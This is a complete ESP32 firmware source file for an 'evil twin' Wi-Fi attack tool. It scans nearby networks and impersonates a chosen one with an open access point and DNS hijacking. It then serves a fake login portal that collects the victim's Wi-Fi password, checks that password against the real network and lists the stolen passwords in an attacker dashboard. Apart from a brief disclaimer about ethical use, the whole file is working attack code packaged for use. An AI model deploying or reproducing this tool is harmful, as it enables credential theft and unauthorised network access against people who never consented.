/*
  ESP32 "Smart Evil Twin" - UNIVERSAL COMPATIBILITY EDITION
  Features a modern dashboard UI, persistent settings, and real-time password verification.
  Version: 1.4 (Adds show/hide password toggle to captive portal)

  WARNING: FOR EDUCATIONAL AND ETHICAL SECURITY TESTING ON YOUR OWN NETWORKS ONLY.
           UNAUTHORIZED USE IS ILLEGAL AND UNETHICAL.
*/

// ================= LIBRARIES =================
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Preferences.h> // For saving settings
#include <map>           // For storing multiple captured credentials

// ================= SETTINGS & GLOBALS =================
WebServer server(80);
DNSServer dnsServer;
Preferences preferences; // Preferences object

// --- Control AP credentials (can be changed via web UI) ---
String control_ap_ssid = "Deauth";
String control_ap_password = "12345678";

// --- State Management & Data Storage ---
bool isEvilTwinActive = false;
bool loginFailed = false;
String currentTargetSSID = "";
std::map<String, String> capturedCredentials;

// ============================= WEB PAGE HTML with BOOTSTRAP =============================
const char* HTML_HEADER = R"rawliteral(
<!DOCTYPE html><html lang="en" data-bs-theme="dark"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">  <title>Smart Evil Twin</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<style>.btn-danger{--bs-btn-bg:#a02c2c;--bs-btn-border-color:#a02c2c;--bs-btn-hover-bg:#c0392b;--bs-btn-hover-border-color:#c0392b;} body{padding-top:20px; padding-bottom: 20px;}</style>
</head><body><div class="container">
)rawliteral";

const char* HTML_FOOTER = R"rawliteral(</div><script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script></body></html>)rawliteral";

const char* CHECKING_PAGE = R"rawliteral(
<meta http-equiv='refresh' content='5; url=http://connectivitycheck.gstatic.com/generate_204'>
<div class="text-center" style="margin-top:20vh;">
<div class="spinner-border text-primary" role="status" style="width:3rem; height:3rem;"></div>
<h3 class="mt-3">Connecting to the network...</h3><p class="text-muted">You will be redirected shortly.</p></div>
)rawliteral";

// ================= HELPER FUNCTIONS & WEB HANDLERS =================

void restartControlAP() {
  isEvilTwinActive = false;
  dnsServer.stop();
  WiFi.mode(WIFI_AP);
  WiFi.softAP(control_ap_ssid.c_str(), control_ap_password.c_str());
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  server.begin();
  Serial.println("Control AP '" + control_ap_ssid + "' is active at 192.168.4.1");
}

void startEvilTwinAP() {
  String fake_ssid = currentTargetSSID + " 5G";
  WiFi.mode(WIFI_AP);
  WiFi.softAP(fake_ssid.c_str(), NULL);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
  server.begin();
  isEvilTwinActive = true;
  Serial.println("Evil Twin Started. Impersonating: " + fake_ssid);
}

void handleSettings() {
  String new_ssid = server.arg("ssid");
  String new_pass = server.arg("password");
  if (new_ssid.length() > 0 && new_pass.length() >= 8) {
    preferences.begin("control-ap", false);
    preferences.putString("ssid", new_ssid);
    preferences.putString("password", new_pass);
    preferences.end();
    Serial.println("Settings saved. New SSID: " + new_ssid);
    control_ap_ssid = new_ssid;
    control_ap_password = new_pass;
    String page = HTML_HEADER;
    page += F("<h1>Settings Saved</h1><div class='alert alert-success'>Control AP is restarting with the new credentials. Please reconnect to the new network.</div>");
    page += "<p><strong>New SSID:</strong> " + new_ssid + "</p>";
    page += F("<p>You will be disconnected momentarily.</p>");
    page += HTML_FOOTER;
    server.send(200, "text/html", page);
    delay(1000);
    restartControlAP();
  } else {
    String page = HTML_HEADER;
    page += F("<h1>Error</h1><div class='alert alert-danger'>Could not save settings. SSID cannot be empty and password must be at least 8 characters long.</div>");
    page += F("<a href='/' class='btn btn-primary'>Go Back</a>");
    page += HTML_FOOTER;
    server.send(400, "text/html", page);
  }
}

void handleRoot() {
  String page = HTML_HEADER;
  page += F(R"rawliteral(
    <div class="d-flex justify-content-between align-items-center mb-4 pb-2 border-bottom border-secondary">
      <h1 class="mb-0 d-flex align-items-center">
        <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="currentColor" class="bi bi-shield-lock-fill me-3" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.19.829.19s.548-.058.829-.19c.304-.143.662-.352 1.048-.625a11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.262c-.658-.215-1.777-.57-2.887-.87C9.843.266 8.69 0 8 0m0 5a1.5 1.5 0 0 1 .5 2.915l.385 1.99a.5.5 0 0 1-.491.595h-.788a.5.5 0 0 1-.49-.595l.384-1.99A1.5 1.5 0 0 1 8 5"/></svg>
        <span>SET Control Panel</span>
      </h1>
      <span class="badge bg-success fs-6">Status: IDLE</span>
    </div>
  )rawliteral");
  page += F(R"rawliteral(
    <div class="card text-center bg-body-tertiary border-danger border-2 mb-4">
      <div class="card-body p-4">
        <h4 class="card-title text-danger-emphasis">Launch Attack</h4>
        <p class="card-text text-body-secondary mb-4">Scan for nearby networks and select a target to begin the Evil Twin impersonation.</p>
        <a href="/scan" class="btn btn-danger btn-lg px-5">
          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-bullseye me-2" viewBox="0 0 16 16"><path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14m0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16"/><path d="M8 13A5 5 0 1 1 8 3a5 5 0 0 1 0 10m0 1A6 6 0 1 0 8 2a6 6 0 0 0 0 12"/><path d="M8 11a3 3 0 1 1 0-6 3 3 0 0 1 0 6m0 1a4 4 0 1 0 0-8 4 4 0 0 0 0 8"/><path d="M9.5 8a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0"/></svg>
          Start Scan
        </a>
      </div>
    </div>
  )rawliteral");
  page += F("<div class='row g-4'>");
  page += F(R"rawliteral(
    <div class="col-lg-7">
      <div class="card h-100">
        <div class="card-header d-flex align-items-center">
          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-key-fill me-2" viewBox="0 0 16 16"><path d="M3.5 11.5a3.5 3.5 0 1 1 3.163-5H14L15.5 8 14 9.5l-1-1-1 1-1-1-1 1-1-1-1 1H6.663a3.5 3.5 0 0 1-3.163 2zM2.5 9a1 1 0 1 0 0-2 1 1 0 0 0 0 2"/></svg>
          <h5 class="mb-0">Captured Credentials</h5>
        </div>
  )rawliteral");
  if (capturedCredentials.empty()) {
    page += F(R"rawliteral(
        <div class="card-body text-center d-flex align-items-center justify-content-center">
          <p class="text-body-secondary m-0">No data has been captured yet.</p>
        </div>
    )rawliteral");
  } else {
    page += F(R"rawliteral(
        <div class="card-body p-0">
          <table class="table table-striped table-hover mb-0">
            <thead>
              <tr><th>Target SSID</th><th>Password</th></tr>
            </thead>
            <tbody>
    )rawliteral");
    for (std::map<String, String>::iterator it = capturedCredentials.begin(); it != capturedCredentials.end(); ++it) {
        page += "<tr><td>" + it->first + "</td><td><code class='fs-6 p-1 bg-dark-subtle rounded-1'>" + it->second + "</code></td></tr>";
    }
    page += F("</tbody></table></div>");
  }
  page += F("</div></div>");
  page += F(R"rawliteral(
    <div class="col-lg-5">
      <div class="card h-100">
        <div class="card-header d-flex align-items-center">
          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-gear-fill me-2" viewBox="0 0 16 16"><path d="M9.405 1.05c-.413-1.4-2.397-1.4-2.81 0l-.1.34a1.464 1.464 0 0 1-2.105.872l-.31-.17c-1.283-.698-2.686.705-1.987 1.987l.169.311a1.464 1.464 0 0 1-.872 2.105l-.34.1c-1.4.413-1.4 2.397 0 2.81l.34.1a1.464 1.464 0 0 1 .872 2.105l-.17.31c-.698 1.283.705 2.686 1.987 1.987l.311-.169a1.464 1.464 0 0 1 2.105.872l.1.34c.413 1.4 2.397 1.4 2.81 0l.1-.34a1.464 1.464 0 0 1 2.105-.872l.31.17c1.283.698 2.686-.705 1.987-1.987l-.169-.311a1.464 1.464 0 0 1 .872-2.105l.34-.1c1.4-.413-1.4-2.397 0-2.81l.34-.1a1.464 1.464 0 0 1 .872-2.105l.17-.31c.698-1.283-.705-2.686-1.987-1.987l-.311.169a1.464 1.464 0 0 1-2.105-.872zM8 10.93a2.929 2.929 0 1 1 0-5.86 2.929 2.929 0 0 1 0 5.858z"/></svg>
          <h5 class="mb-0">Control AP Settings</h5>
        </div>
        <div class="card-body">
          <form action="/settings" method="POST">
            <div class="alert alert-warning small p-2">
              <strong>Note:</strong> Saving will restart the control AP and disconnect you.
            </div>
            <div class="mb-3">
              <label for="ssid" class="form-label">Control SSID</label>
              <input type="text" class="form-control" id="ssid" name="ssid" value=")rawliteral");
  page += control_ap_ssid;
  page += F(R"rawliteral(" required>
            </div>
            <div class="mb-3">
              <label for="password" class="form-label">Control Password</label>
              <input type="password" class="form-control" id="password" name="password" value=")rawliteral");
  page += control_ap_password;
  page += F(R"rawliteral(" minlength="8" required>
              <div class="form-text">Must be at least 8 characters.</div>
            </div>
            <button type="submit" class="btn btn-primary w-100">Save & Restart AP</button>
          </form>
        </div>
      </div>
    </div>
  )rawliteral");
  page += F("</div>");
  page += HTML_FOOTER;
  server.send(200, "text/html", page);
}

void handleScan() {
  String page = HTML_HEADER;
  page += F(R"rawliteral(
<div class="card"><div class="card-header"><h3>Select Network to Impersonate</h3></div>
<div class="card-body"><a href="/scan" class="btn btn-primary w-100 mb-3">Rescan Networks</a>
<a href="/" class="btn btn-secondary w-100">Back to Main Menu</a>
<table class="table table-striped table-hover mt-4"><thead><tr><th>SSID</th><th>Action</th></tr></thead><tbody>
)rawliteral");
  WiFi.mode(WIFI_AP_STA);
  int n = WiFi.scanNetworks();
  if (n > 0) {
    for (int i = 0; i < n; ++i) {
      String ssid = WiFi.SSID(i);
      if (ssid.length() > 0) {
        page += "<tr><td>" + ssid + "</td><td>";
        page += "<form action='/start' method='POST' style='margin:0;'><input type='hidden' name='ssid' value='" + ssid + "'><button type='submit' class='btn btn-sm btn-danger'>Start</button></form>";
        page += "</td></tr>";
      }
    }
  } else {
    page += "<tr><td colspan='2'>No networks found. Try rescanning.</td></tr>";
  }
  page += F("</tbody></table></div></div>");
  page += HTML_FOOTER;
  server.send(200, "text/html", page);
}

void handleNotFound() {
  if (isEvilTwinActive) {
    String page = F(R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Wi-Fi Login</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; }
    body { background-color: #f4f6f9; font-family: 'Poppins', sans-serif; height: 100vh; margin: 0; display: flex; justify-content: center; align-items: center; }
    .login-card { background: #fff; border-radius: 1rem; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1); padding: 2rem; width: 100%; max-width: 400px; }
    .login-card h4 { font-weight: 600; text-align: center; margin-bottom: 0.5rem; color: #333; }
    .login-card p { text-align: center; color: #6c757d; margin-bottom: 1.5rem; }
    .login-card .form-control { border-radius: 0.5rem; padding: 0.75rem; }
    .login-card .btn { padding: 0.75rem; border-radius: 0.5rem; font-weight: 600; }
    .wifi-icon { display: block; margin: 0 auto 1rem; width: 48px; height: 48px; opacity: 0.9; }
    .password-wrapper { position: relative; }
    .password-wrapper .toggle-password { position: absolute; top: 50%; right: 10px; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: #6c757d; padding: 5px; }
  </style>
</head>
<body>
  <div class="login-card">
    <svg class="wifi-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#007bff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
      <path d="M5 12.55a11 11 0 0 1 14.08 0" /><path d="M1.42 9a16 16 0 0 1 21.16 0" /><path d="M8.53 16.11a6 6 0 0 1 6.95 0" /><line x1="12" y1="20" x2="12.01" y2="20" />
    </svg>
    <h4>Connect to )rawliteral");
page += currentTargetSSID;
page += F(R"rawliteral(</h4>
    <p>Enter the Wi-Fi password to continue</p>
)rawliteral");

if (loginFailed) {
  page += F("<div class='alert alert-danger text-center' role='alert'>Incorrect password. Please try again.</div>");
  loginFailed = false;
}

page += F(R"rawliteral(
    <form action="/capture" method="POST">
      <div class="mb-3 password-wrapper">
        <input type="password" name="password" id="password-input" class="form-control form-control-lg" style="padding-right: 45px;" placeholder="Wi-Fi Password" required autofocus />
        <button type="button" id="toggle-password" class="toggle-password">
          <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-eye-fill" viewBox="0 0 16 16"><path d="M10.5 8a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0"/><path d="M0 8s3-5.5 8-5.5S16 8 16 8s-3 5.5-8 5.5S0 8 0 8m8 3.5a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7"/></svg>
        </button>
      </div>
      <button type="submit" class="btn btn-primary w-100">Connect</button>
    </form>
  </div>
  <script>
    const togglePassword = document.getElementById('toggle-password');
    const passwordInput = document.getElementById('password-input');
    const eyeIcon = document.getElementById('eye-icon');
    const eyeIconHTML = `<svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-eye-fill" viewBox="0 0 16 16"><path d="M10.5 8a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0"/><path d="M0 8s3-5.5 8-5.5S16 8 16 8s-3 5.5-8 5.5S0 8 0 8m8 3.5a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7"/></svg>`;
    const eyeSlashIconHTML = `<svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-eye-slash-fill" viewBox="0 0 16 16"><path d="m10.79 12.912-1.614-1.615a3.5 3.5 0 0 1-4.474-4.474l-2.06-2.06C.938 6.278 0 8 0 8s3 5.5 8 5.5a7.029 7.029 0 0 0 2.79-.588M5.21 3.088A7.028 7.028 0 0 1 8 2.5c5 0 8 5.5 8 5.5s-.939 1.721-2.641 3.238l-2.062-2.062a3.5 3.5 0 0 0-4.474-4.474L5.21 3.089z"/><path d="M5.525 7.646a2.5 2.5 0 0 0 2.829 2.829l-2.83-2.829zm4.95.708-2.829-2.83a2.5 2.5 0 0 1 2.829 2.829zm3.171 6-12-12 .708-.708 12 12z"/></svg>`;
    togglePassword.addEventListener('click', function () {
      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
      passwordInput.setAttribute('type', type);
      this.innerHTML = type === 'password' ? eyeIconHTML : eyeSlashIconHTML;
    });
  </script>
</body>
</html>
)rawliteral");
    server.send(200, "text/html", page);
  } else {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  }
}

void handleCapture() {
  if (server.hasArg("password")) {
    String password = server.arg("password");
    Serial.println("Password received for " + currentTargetSSID + ": " + password);
    Serial.println("Attempting to verify password...");

    String page = HTML_HEADER;
    page += CHECKING_PAGE;
    page += HTML_FOOTER;
    server.send(200, "text/html", page);
    delay(500);

    server.stop();
    dnsServer.stop();
    
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.begin(currentTargetSSID.c_str(), password.c_str());

    int timeout = 0;
    while (WiFi.status() != WL_CONNECTED && timeout < 20) {
      delay(500);
      timeout++;
    }

    if (WiFi.status() == WL_CONNECTED) {
      Serial.println("!!! SUCCESS: PASSWORD VERIFIED & CAPTURED for " + currentTargetSSID + ": " + password);
      capturedCredentials[currentTargetSSID] = password;
      WiFi.disconnect(true);
      restartControlAP();
    } else {
      Serial.println("!!! FAILURE: Password verification failed for " + currentTargetSSID);
      WiFi.disconnect(true);
      loginFailed = true;
      startEvilTwinAP();
    }
  }
}

void handleStatus() {
  String page = HTML_HEADER;
  page += F("<div class='card text-center mt-5'><div class='card-header bg-warning text-dark'><h3>Attack Active</h3></div><div class='card-body'>");
  page += "<p class='lead'>Impersonating <strong>" + currentTargetSSID + " 5G</strong>.</p>";
  page += F("<p>Waiting for a victim to connect and enter their credentials. The device will automatically return to the control panel once a valid password is captured.</p>");
  page += F("<p class='mt-4'><strong>To stop this attack manually, you must reboot the ESP32 device.</strong></p>");
  page += F("</div></div>");
  page += HTML_FOOTER;
  server.send(200, "text/html", page);
}

void handleStartEvilTwin() {
  if (server.hasArg("ssid")) {
    currentTargetSSID = server.arg("ssid");
    startEvilTwinAP();
    server.sendHeader("Location", "/status", true);
    server.send(302, "text/plain", "");
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n\nESP32 Smart Evil Twin [Dashboard Edition] Booting...");

  preferences.begin("control-ap", true);
  String saved_ssid = preferences.getString("ssid", "");
  if (saved_ssid.length() > 0) {
    control_ap_ssid = saved_ssid;
    control_ap_password = preferences.getString("password", "12345678");
    Serial.println("Loaded saved credentials. SSID: " + control_ap_ssid);
  } else {
    Serial.println("No saved credentials found. Using default: " + control_ap_ssid);
  }
  preferences.end();
  
  restartControlAP();
  
  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/start", HTTP_POST, handleStartEvilTwin);
  server.on("/status", HTTP_GET, handleStatus);
  server.on("/capture", HTTP_POST, handleCapture);
  server.on("/settings", HTTP_POST, handleSettings);
  server.onNotFound(handleNotFound);
}

void loop() {
  server.handleClient();
  if (isEvilTwinActive) {
    dnsServer.processNextRequest();
  }
}